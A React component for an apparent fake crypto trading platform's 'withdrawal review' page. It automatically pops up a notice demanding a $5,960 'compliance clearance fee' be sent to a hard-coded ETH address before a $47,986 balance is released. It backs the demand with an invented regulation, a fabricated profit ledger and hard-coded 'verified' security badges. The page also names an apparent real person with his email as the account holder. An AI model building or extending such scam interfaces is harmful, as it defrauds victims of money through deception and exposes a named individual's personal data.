import React, { useState, useEffect } from 'react';
import { useTrading } from '../../context/TradingContext';
import { 
  ShieldAlert, 
  ArrowLeft, 
  CheckCircle2, 
  AlertTriangle, 
  Copy, 
  Check, 
  Wallet, 
  DollarSign, 
  ArrowUpRight, 
  FileText, 
  Lock, 
  HelpCircle,
  ExternalLink,
  ShieldCheck,
  Clock,
  History,
  Info,
  Zap,
  CreditCard,
  BadgeCheck,
  Printer
} from 'lucide-react';
import { InvestmentNoticeModal } from './InvestmentNoticeModal';
import { DepositModal } from './DepositModal';
import { AuthCardModal } from '../auth/AuthCardModal';

export const WithdrawalReviewView: React.FC = () => {
  const { 
    user, 
    cashBalanceUSD, 
    attemptedWithdrawalAmount, 
    attemptedWithdrawalAddress,
    setCurrentPage, 
    addToast,
    investmentNoticeOpen,
    setInvestmentNoticeOpen,
    showInvestmentNotice
  } = useTrading();

  const [copiedAddress, setCopiedAddress] = useState(false);
  const [copiedDestAddress, setCopiedDestAddress] = useState(false);
  const [depositModalOpen, setDepositModalOpen] = useState(false);
  const [authCardModalOpen, setAuthCardModalOpen] = useState(false);
  
  const complianceEthAddress = '0x003bB95cE0010Fa8e9F7d81884f506355387cA1A';
  const effectiveWithdrawAmount = attemptedWithdrawalAmount || cashBalanceUSD || 47986.00;
  const effectiveAddress = attemptedWithdrawalAddress || '0x71C84092bF589A389Afb60f1A953b018599Ac02e';

  // Automatically trigger compliance alert upon entering review page
  useEffect(() => {
    const timer = setTimeout(() => {
      showInvestmentNotice(effectiveWithdrawAmount, effectiveAddress);
    }, 400);
    return () => clearTimeout(timer);
  }, []);

  const handleCopyClearance = () => {
    navigator.clipboard.writeText(complianceEthAddress);
    setCopiedAddress(true);
    addToast({
      type: 'info',
      title: 'Address Copied',
      message: 'Settlement address copied to clipboard.',
      duration: 2500,
    });
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const handleCopyDest = () => {
    navigator.clipboard.writeText(effectiveAddress);
    setCopiedDestAddress(true);
    addToast({
      type: 'info',
      title: 'Address Copied',
      message: 'Destination address copied to clipboard.',
      duration: 2500,
    });
    setTimeout(() => setCopiedDestAddress(false), 2000);
  };

  const [copiedSnippet, setCopiedSnippet] = useState(false);
  const [activeSnippetTab, setActiveSnippetTab] = useState<'link' | 'button'>('link');

  const htmlLinkSnippet = `<a href="/#/withdrawal-review" class="btn-review">\n  Continue to Withdrawal Review\n</a>`;
  const htmlButtonSnippet = `<button onclick="window.location.hash = '#/withdrawal-review'">\n  Continue to Withdrawal Review\n</button>`;

  const handleCopySnippet = (snippet: string) => {
    navigator.clipboard.writeText(snippet);
    setCopiedSnippet(true);
    addToast({
      type: 'info',
      title: 'HTML Snippet Copied',
      message: 'HTML snippet copied to clipboard.',
      duration: 2500,
    });
    setTimeout(() => setCopiedSnippet(false), 2000);
  };

  const historyLedger = [
    {
      date: 'Current / Active (Immediate Review)',
      action: 'Available Balance Withdrawal Review',
      amount: '$47,986.00',
      payout: '$47,986.00',
      fee: '$5,960.00 (Pending)',
      note: '$5,960.00 has to be paid before the available balance can be withdrawn, to meet the investment.',
      badge: 'TOP REVIEW #1 (ACTIVE)',
      badgeColor: 'text-amber-300 bg-amber-500/20 border-amber-500/60 font-black animate-pulse',
      isTopReview: true
    },
    {
      date: 'April 12, 2022',
      action: 'Invested',
      amount: '$4,000.00',
      profit: '+$12,000.00',
      note: 'Reinvested on July 7, 2022',
      badge: 'Reinvested',
      badgeColor: 'text-indigo-400 bg-indigo-500/10 border-indigo-500/20'
    },
    {
      date: 'January 5, 2022',
      action: 'Invested & Withdrew',
      amount: '$6,000.00',
      payout: '$14,000.00',
      fee: '$1,800.00',
      note: 'Withdrawal fee settled: $1,800.00',
      badge: 'Completed',
      badgeColor: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20'
    },
    {
      date: 'September 20, 2021',
      action: 'Invested & Withdrew',
      amount: '$10,000.00',
      payout: '$31,000.00',
      fee: '$3,900.00',
      note: 'Withdrawal fee settled: $3,900.00',
      badge: 'Completed',
      badgeColor: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20'
    },
    {
      date: 'February 10, 2021',
      action: 'Invested & Withdrew',
      amount: '$1,000.00',
      payout: '$4,000.00',
      fee: '$700.00',
      note: 'Withdrawal fee settled: $700.00',
      badge: 'Completed',
      badgeColor: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20'
    },
    {
      date: 'July 14, 2020',
      action: 'Invested & Withdrew',
      amount: '$7,000.00',
      payout: '$16,000.00',
      fee: '$2,000.00',
      note: 'Withdrawal fee settled: $2,000.00',
      badge: 'Completed',
      badgeColor: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20'
    },
    {
      date: 'January 6, 2020',
      action: 'Invested & Withdrew',
      amount: '$500.00',
      payout: '$2,000.00',
      fee: '$300.00',
      note: 'Withdrawal fee settled: $300.00',
      badge: 'Completed',
      badgeColor: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20'
    },
    {
      date: 'October 29, 2019',
      action: 'Invested & Withdrew',
      amount: '$4,000.00',
      payout: '$12,000.00',
      fee: '$1,264.00',
      note: 'Withdrawal fee settled: $1,264.00',
      badge: 'Completed',
      badgeColor: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20'
    },
    {
      date: 'March 8, 2019',
      action: 'First Account Deposit',
      amount: '$5,000.00',
      payout: '$11,750.00',
      fee: '$1,586.00',
      note: 'Initial deposit invested; yield withdrawal fee: $1,586.00',
      badge: 'Account Origin',
      badgeColor: 'text-sky-400 bg-sky-500/10 border-sky-500/20'
    }
  ];

  return (
    <div className="space-y-6 max-w-5xl mx-auto pb-12 animate-in fade-in duration-300">
      {/* Top Header Navigation */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-800">
        <div className="flex items-center gap-3">
          <button
            type="button"
            onClick={() => setCurrentPage('dashboard')}
            className="p-2 rounded-xl bg-slate-900 border border-slate-800 hover:bg-slate-800 text-slate-300 hover:text-white transition-all cursor-pointer shadow-sm"
            title="Return to Dashboard"
          >
            <ArrowLeft className="w-5 h-5" />
          </button>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-xs font-mono text-emerald-400 font-bold uppercase tracking-wider">
                Portal Route: /#/withdrawal-review
              </span>
              <span className="px-2 py-0.5 rounded-full bg-amber-500/20 border border-amber-500/40 text-[10px] font-bold text-amber-300 animate-pulse">
                Verification Required
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl font-black text-slate-100 tracking-tight">
              Withdrawal Review & Compliance Authorization
            </h1>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <button
            type="button"
            id="btn-review-inspect-authcard"
            onClick={() => setAuthCardModalOpen(true)}
            className="px-3.5 py-2 rounded-xl bg-slate-800/90 hover:bg-slate-700/90 border border-slate-700 text-slate-200 text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer"
            title="Inspect Institutional AuthCard (BTN-8849)"
          >
            <CreditCard className="w-4 h-4 text-amber-400" />
            <span>AuthCard</span>
          </button>
          <button
            type="button"
            onClick={() => showInvestmentNotice(effectiveWithdrawAmount, effectiveAddress)}
            className="px-3.5 py-2 rounded-xl bg-amber-500/15 border border-amber-500/30 hover:bg-amber-500/25 text-amber-300 text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer"
          >
            <ShieldAlert className="w-4 h-4 text-amber-400" />
            <span>Open Investment Notice</span>
          </button>
          <button
            type="button"
            onClick={() => setDepositModalOpen(true)}
            className="px-4 py-2 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 text-xs font-black transition-all shadow-lg shadow-emerald-500/20 cursor-pointer flex items-center gap-1.5"
          >
            <DollarSign className="w-4 h-4" />
            <span>Pay Fee ($5,960.00)</span>
          </button>
        </div>
      </div>

      {/* TOP FIRST REVIEW IMMEDIATELY BANNER & HTML SNIPPET */}
      <div className="p-4 sm:p-5 rounded-2xl bg-gradient-to-r from-emerald-950/40 via-slate-900 to-slate-900 border-2 border-emerald-500/60 shadow-2xl space-y-4">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-3 border-b border-slate-800">
          <div className="space-y-1">
            <div className="flex items-center gap-2">
              <span className="px-3 py-1 rounded-full bg-emerald-500 text-slate-950 font-black text-xs uppercase tracking-wider flex items-center gap-1.5 shadow-md shadow-emerald-500/20">
                <Zap className="w-3.5 h-3.5" />
                Top First Review Immediately
              </span>
              <span className="text-[11px] font-bold text-amber-300 bg-amber-500/15 px-2 py-0.5 rounded border border-amber-500/30">
                $5,960.00 Fee Required
              </span>
            </div>
            <div className="text-xs text-slate-300">
              Review is: <code className="text-emerald-400 font-bold font-mono bg-slate-950 px-2 py-0.5 rounded border border-slate-800">/#/withdrawal-review</code> (or <code className="text-emerald-400 font-bold font-mono bg-slate-950 px-2 py-0.5 rounded border border-slate-800">#/withdrawal-review</code>)
            </div>
          </div>

          <div className="flex items-center gap-2">
            <a
              href="/#/withdrawal-review"
              id="btn-immediate-top-review"
              data-testid="continue-to-withdrawal-review"
              className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-slate-950 font-black text-xs sm:text-sm transition-all shadow-lg shadow-emerald-500/25 active:scale-95 flex items-center gap-1.5"
            >
              <span>Continue to Withdrawal Review</span>
              <ArrowUpRight className="w-4 h-4" />
            </a>
          </div>
        </div>

        {/* Ready-to-use HTML Snippet for Your Button / Link */}
        <div className="p-3.5 rounded-xl bg-slate-950/80 border border-slate-800 space-y-2.5">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
            <div className="flex items-center gap-2 text-xs font-bold text-slate-200">
              <FileText className="w-4 h-4 text-emerald-400" />
              <span>HTML Snippet for Your Button / Link:</span>
            </div>
            <div className="flex items-center gap-1 bg-slate-900 p-0.5 rounded-lg border border-slate-800 text-[11px] self-start sm:self-auto">
              <button
                type="button"
                onClick={() => setActiveSnippetTab('link')}
                className={`px-2.5 py-1 rounded-md font-bold transition-all cursor-pointer ${
                  activeSnippetTab === 'link' 
                    ? 'bg-emerald-500 text-slate-950 shadow-sm' 
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                Anchor &lt;a&gt; Link
              </button>
              <button
                type="button"
                onClick={() => setActiveSnippetTab('button')}
                className={`px-2.5 py-1 rounded-md font-bold transition-all cursor-pointer ${
                  activeSnippetTab === 'button' 
                    ? 'bg-emerald-500 text-slate-950 shadow-sm' 
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                Button &lt;button&gt;
              </button>
            </div>
          </div>

          <div className="relative">
            <pre className="font-mono text-xs text-emerald-300 bg-slate-900 p-3 rounded-lg border border-slate-800 overflow-x-auto select-all leading-relaxed">
              {activeSnippetTab === 'link' ? htmlLinkSnippet : htmlButtonSnippet}
            </pre>
            <button
              type="button"
              onClick={() => handleCopySnippet(activeSnippetTab === 'link' ? htmlLinkSnippet : htmlButtonSnippet)}
              className="absolute top-2 right-2 px-3 py-1.5 rounded-md bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold border border-slate-700 flex items-center gap-1.5 cursor-pointer transition-all shadow-sm"
            >
              {copiedSnippet ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              <span>{copiedSnippet ? 'Copied!' : 'Copy HTML Snippet'}</span>
            </button>
          </div>
        </div>
      </div>

      {/* Primary Compliance Notification Banner */}
      <div className="p-4 sm:p-5 rounded-2xl bg-gradient-to-r from-amber-500/20 via-amber-500/10 to-slate-900 border-2 border-amber-500/50 shadow-2xl space-y-3 relative overflow-hidden">
        <div className="absolute top-0 right-0 w-32 h-32 bg-amber-500/10 rounded-full blur-2xl pointer-events-none" />
        <div className="flex items-start gap-3.5">
          <div className="p-2.5 rounded-xl bg-amber-500/30 border border-amber-500/50 text-amber-300 shrink-0 mt-0.5 shadow-lg">
            <ShieldAlert className="w-6 h-6 animate-pulse" />
          </div>
          <div className="space-y-1.5 flex-1">
            <div className="flex flex-wrap items-center gap-2">
              <span className="text-xs font-black text-amber-300 uppercase tracking-widest bg-amber-500/20 px-2 py-0.5 rounded-md border border-amber-500/30">
                Institutional Investment Rule Alert
              </span>
              <span className="text-xs text-slate-400 font-mono">
                Regulation Protocol §4.2
              </span>
            </div>
            <p className="text-base sm:text-lg font-black text-white leading-tight">
              $5,960.00 has to be paid before the available balance can be withdrawn, to meet with the investment rules.
            </p>
            <p className="text-xs text-slate-300 leading-relaxed max-w-3xl">
              Regardless of the requested withdrawal amount, your current account tier and institutional investment structure require fulfillment of the compliance clearance fee of <span className="font-bold text-amber-300">$5,960.00 USD</span>. Upon settlement, the full balance of <span className="font-bold text-emerald-400">${cashBalanceUSD.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</span> will disburse immediately to your requested wallet.
            </p>
          </div>
        </div>

        {/* Action Clearance Address Strip */}
        <div className="mt-2 pt-3 border-t border-amber-500/20 flex flex-col md:flex-row md:items-center justify-between gap-3 bg-slate-950/70 p-3.5 rounded-xl border border-slate-800">
          <div className="space-y-0.5">
            <div className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
              <Lock className="w-3.5 h-3.5 text-amber-400" />
              <span>Compliance Settlement Escrow Address (ETH / ERC-20)</span>
            </div>
            <div className="font-mono text-xs sm:text-sm text-amber-300 font-bold truncate max-w-lg select-all">
              {complianceEthAddress}
            </div>
          </div>
          <div className="flex items-center gap-2 shrink-0">
            <button
              type="button"
              onClick={handleCopyClearance}
              className="px-3.5 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer shadow-sm"
            >
              {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              <span>{copiedAddress ? 'Copied' : 'Copy Settlement Address'}</span>
            </button>
            <button
              type="button"
              onClick={() => setDepositModalOpen(true)}
              className="px-4 py-2 rounded-lg bg-amber-500 hover:bg-amber-400 text-slate-950 text-xs font-black transition-all cursor-pointer shadow-md flex items-center gap-1"
            >
              <span>Settle $5,960.00 Now</span>
              <ArrowUpRight className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </div>

      {/* INSTITUTIONAL AUTHCARD VERIFICATION SECTION */}
      <div className="p-4 sm:p-5 rounded-2xl glass-panel border border-emerald-500/40 shadow-xl flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-3.5">
          <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-amber-400/20 via-emerald-500/20 to-teal-500/20 border border-emerald-500/40 flex items-center justify-center text-amber-400 shrink-0 shadow-inner">
            <CreditCard className="w-6 h-6 text-amber-400" />
          </div>
          <div>
            <div className="flex flex-wrap items-center gap-2">
              <span className="text-xs sm:text-sm font-bold text-slate-100">
                Institutional AuthCard: <span className="font-mono text-emerald-400">BTN-AUTH-8849-2026</span>
              </span>
              <span className="px-2 py-0.5 rounded-full bg-emerald-500/15 border border-emerald-500/30 text-[9px] font-bold text-emerald-400 flex items-center gap-1">
                <BadgeCheck className="w-3 h-3 text-emerald-400" />
                <span>Tier 2 Clearance</span>
              </span>
            </div>
            <p className="text-xs text-slate-300 mt-0.5">
              Verified Holder: <strong>Joshua James Bergin</strong> &bull; <span className="text-slate-400 font-mono">Berginjoshua1@gmail.com</span>
            </p>
            <div className="text-[11px] text-slate-400 mt-1 flex flex-wrap items-center gap-x-3 gap-y-0.5 font-mono">
              <span>Balance: <strong className="text-emerald-400">${(effectiveWithdrawAmount).toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong></span>
              <span>&bull;</span>
              <span>Required Clearance Fee: <strong className="text-amber-400">$5,960.00</strong></span>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-2 shrink-0">
          <button
            type="button"
            onClick={() => setAuthCardModalOpen(true)}
            className="flex-1 md:flex-initial px-4 py-2.5 rounded-xl bg-emerald-500/15 hover:bg-emerald-500/25 border border-emerald-500/40 text-emerald-300 text-xs font-bold transition-all flex items-center justify-center gap-1.5 cursor-pointer active:scale-95"
          >
            <CreditCard className="w-4 h-4 text-emerald-400" />
            <span>Inspect 3D AuthCard</span>
          </button>
          <button
            type="button"
            onClick={() => window.print()}
            className="flex-1 md:flex-initial px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-200 text-xs font-bold transition-all flex items-center justify-center gap-1.5 cursor-pointer active:scale-95"
            title="Print official clearance certificate"
          >
            <Printer className="w-4 h-4 text-cyan-400" />
            <span>Print PDF</span>
          </button>
        </div>
      </div>

      {/* Grid: Withdrawal Specifications & Account Verification */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Review Details Card */}
        <div className="lg:col-span-7 space-y-6">
          <div className="glass-panel rounded-2xl p-5 border border-slate-700/60 shadow-xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-800">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 flex items-center justify-center font-bold">
                  <ArrowUpRight className="w-4 h-4" />
                </div>
                <div>
                  <h2 className="text-sm font-bold text-slate-100">
                    Withdrawal Order Specifications
                  </h2>
                  <p className="text-[11px] text-slate-400">
                    Cryptographic order review and ledger routing breakdown
                  </p>
                </div>
              </div>
              <span className="px-2.5 py-1 rounded-full bg-slate-800 text-[11px] font-mono text-slate-300 font-bold border border-slate-700">
                ORD-REV-2026-9842
              </span>
            </div>

            <div className="space-y-3 text-xs">
              <div className="flex items-center justify-between p-2.5 rounded-xl bg-slate-900/60 border border-slate-800/80">
                <span className="text-slate-400 font-medium">Account Profile</span>
                <span className="font-bold text-slate-100">
                  {user?.name || 'Joshua James Bergin'}
                </span>
              </div>

              <div className="flex items-center justify-between p-2.5 rounded-xl bg-slate-900/60 border border-slate-800/80">
                <span className="text-slate-400 font-medium">Registered Client Email</span>
                <span className="font-mono text-slate-200">
                  {user?.email || 'Berginjoshua1@gmail.com'}
                </span>
              </div>

              <div className="flex items-center justify-between p-2.5 rounded-xl bg-slate-900/60 border border-slate-800/80">
                <span className="text-slate-400 font-medium">Total Available Balance</span>
                <span className="font-mono font-bold text-emerald-400 text-sm">
                  ${cashBalanceUSD.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
                </span>
              </div>

              <div className="flex items-center justify-between p-2.5 rounded-xl bg-slate-900/60 border border-slate-800/80">
                <span className="text-slate-400 font-medium">Requested Withdrawal Amount</span>
                <span className="font-mono font-black text-slate-100 text-sm">
                  ${effectiveWithdrawAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
                </span>
              </div>

              <div className="p-2.5 rounded-xl bg-slate-900/60 border border-slate-800/80 space-y-1">
                <div className="flex items-center justify-between">
                  <span className="text-slate-400 font-medium">Destination Wallet Address</span>
                  <button
                    type="button"
                    onClick={handleCopyDest}
                    className="text-[10px] text-emerald-400 hover:text-emerald-300 font-bold flex items-center gap-1 cursor-pointer"
                  >
                    {copiedDestAddress ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedDestAddress ? 'Copied' : 'Copy'}</span>
                  </button>
                </div>
                <div className="font-mono text-[11px] text-slate-200 break-all select-all font-semibold">
                  {effectiveAddress}
                </div>
              </div>

              <div className="flex items-center justify-between p-2.5 rounded-xl bg-slate-900/60 border border-slate-800/80">
                <span className="text-slate-400 font-medium">Disbursal Network</span>
                <span className="font-bold text-slate-200">
                  USDT (TRC20 - Tron Network)
                </span>
              </div>

              <div className="flex items-center justify-between p-2.5 rounded-xl bg-slate-900/60 border border-slate-800/80">
                <span className="text-slate-400 font-medium">Network Gas Fee</span>
                <span className="font-mono text-emerald-400 font-bold">
                  $0.00 (Platform Covered)
                </span>
              </div>

              <div className="flex items-center justify-between p-3 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-300">
                <span className="font-bold">Required Investment Rule Clearance Fee</span>
                <span className="font-mono font-black text-base text-amber-300">
                  $5,960.00 USD
                </span>
              </div>
            </div>

            {/* Quick Actions */}
            <div className="pt-2 flex flex-col sm:flex-row gap-2.5">
              <button
                type="button"
                onClick={() => setDepositModalOpen(true)}
                className="flex-1 py-3 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-xs transition-all shadow-lg shadow-emerald-500/20 cursor-pointer flex items-center justify-center gap-2"
              >
                <DollarSign className="w-4 h-4" />
                <span>Pay Clearance Fee ($5,960.00)</span>
              </button>
              <button
                type="button"
                onClick={() => setCurrentPage('dashboard')}
                className="py-3 px-5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold text-xs transition-colors cursor-pointer"
              >
                Return to Dashboard
              </button>
            </div>
          </div>
        </div>

        {/* Right Column: Investment Security & Policy Notice */}
        <div className="lg:col-span-5 space-y-6">
          {/* Security Status Box */}
          <div className="glass-panel rounded-2xl p-5 border border-slate-700/60 shadow-xl space-y-4">
            <div className="flex items-center gap-2.5 pb-3 border-b border-slate-800">
              <div className="w-8 h-8 rounded-lg bg-sky-500/10 border border-sky-500/20 text-sky-400 flex items-center justify-center">
                <ShieldCheck className="w-4 h-4" />
              </div>
              <div>
                <h3 className="text-sm font-bold text-slate-100">
                  Authentication Status
                </h3>
                <p className="text-[11px] text-slate-400">
                  Cryptographic ledger verification
                </p>
              </div>
            </div>

            <div className="space-y-2.5 text-xs text-slate-300">
              <div className="flex items-center justify-between p-2 rounded-lg bg-slate-900 border border-slate-800">
                <span className="text-slate-400">KYC Status</span>
                <span className="font-bold text-emerald-400 flex items-center gap-1">
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  <span>Tier 2 Verified</span>
                </span>
              </div>
              <div className="flex items-center justify-between p-2 rounded-lg bg-slate-900 border border-slate-800">
                <span className="text-slate-400">Two-Factor Authentication</span>
                <span className="font-bold text-emerald-400 flex items-center gap-1">
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  <span>Enabled (Hardware/TOTP)</span>
                </span>
              </div>
              <div className="flex items-center justify-between p-2 rounded-lg bg-slate-900 border border-slate-800">
                <span className="text-slate-400">Withdrawal Channel</span>
                <span className="font-bold text-amber-400 flex items-center gap-1">
                  <Clock className="w-3.5 h-3.5" />
                  <span>Pending $5,960 Clearance</span>
                </span>
              </div>
            </div>

            <div className="p-3.5 rounded-xl bg-slate-900/80 border border-slate-800 text-[11px] text-slate-400 leading-relaxed space-y-2">
              <div className="font-bold text-slate-200 flex items-center gap-1.5">
                <Info className="w-3.5 h-3.5 text-sky-400" />
                <span>Investment Rule Protocol Overview</span>
              </div>
              <p>
                In strict adherence to institutional fund management compliance, accounts with active yield compounding must complete the scheduled clearance settlement before disallowance locks are released.
              </p>
            </div>
          </div>

          {/* Quick Support / Contact Card */}
          <div className="rounded-2xl bg-slate-900/60 border border-slate-800 p-4 text-xs text-slate-400 space-y-2">
            <div className="font-bold text-slate-200">
              Client & Studio Concierge
            </div>
            <p className="text-[11px] leading-relaxed">
              If you have any questions regarding your $5,960.00 investment clearance settlement, please contact your designated account supervisor or use the compliance address above.
            </p>
          </div>
        </div>
      </div>

      {/* Account Profile Historical Investment & Withdrawal Ledger */}
      <div className="glass-panel rounded-2xl p-5 border border-slate-700/60 shadow-xl space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-3 border-b border-slate-800">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-purple-500/10 border border-purple-500/20 text-purple-400 flex items-center justify-center">
              <History className="w-4 h-4" />
            </div>
            <div>
              <h2 className="text-sm font-bold text-slate-100">
                Profile Investment & Withdrawal Ledger History
              </h2>
              <p className="text-[11px] text-slate-400">
                Historical record for Joshua James Bergin (March 2019 &ndash; Present)
              </p>
            </div>
          </div>
          <span className="text-[11px] font-mono text-emerald-400 font-bold">
            9 Milestones Logged • Top First Review Active Immediately
          </span>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs">
            <thead>
              <tr className="border-b border-slate-800 text-slate-400 text-[11px]">
                <th className="py-2.5 px-3">Date</th>
                <th className="py-2.5 px-3">Action</th>
                <th className="py-2.5 px-3 text-right">Invested Amount</th>
                <th className="py-2.5 px-3 text-right">Withdrawal / Profit</th>
                <th className="py-2.5 px-3 text-right">Settled Fee</th>
                <th className="py-2.5 px-3 text-center">Status</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60">
              {historyLedger.map((row, idx) => (
                <tr 
                  key={idx} 
                  className={`transition-colors ${
                    row.isTopReview 
                      ? 'bg-amber-500/15 hover:bg-amber-500/20 border-l-4 border-l-amber-400' 
                      : 'hover:bg-slate-800/30'
                  }`}
                >
                  <td className="py-3 px-3 font-bold text-slate-100 whitespace-nowrap">
                    {row.date}
                  </td>
                  <td className="py-3 px-3 text-slate-200">
                    <div className="font-semibold">{row.action}</div>
                    <div className={`text-[10px] ${row.isTopReview ? 'text-amber-300 font-medium' : 'text-slate-500'}`}>
                      {row.note}
                    </div>
                  </td>
                  <td className="py-3 px-3 text-right font-mono font-black text-slate-100">
                    {row.amount}
                  </td>
                  <td className="py-3 px-3 text-right font-mono font-black text-emerald-400">
                    {row.payout || row.profit || '—'}
                  </td>
                  <td className="py-3 px-3 text-right font-mono font-bold text-amber-300">
                    {row.fee || '—'}
                  </td>
                  <td className="py-3 px-3 text-center">
                    <span className={`px-2.5 py-1 rounded-full text-[10px] font-black border ${row.badgeColor}`}>
                      {row.badge}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Compliance Notice Modal */}
      <InvestmentNoticeModal
        isOpen={investmentNoticeOpen}
        onClose={() => setInvestmentNoticeOpen(false)}
        onOpenDeposit={() => {
          setInvestmentNoticeOpen(false);
          setDepositModalOpen(true);
        }}
      />

      {/* Deposit Modal */}
      <DepositModal
        isOpen={depositModalOpen}
        onClose={() => setDepositModalOpen(false)}
      />

      {/* Institutional AuthCard Modal */}
      <AuthCardModal
        isOpen={authCardModalOpen}
        onClose={() => setAuthCardModalOpen(false)}
      />
    </div>
  );
};
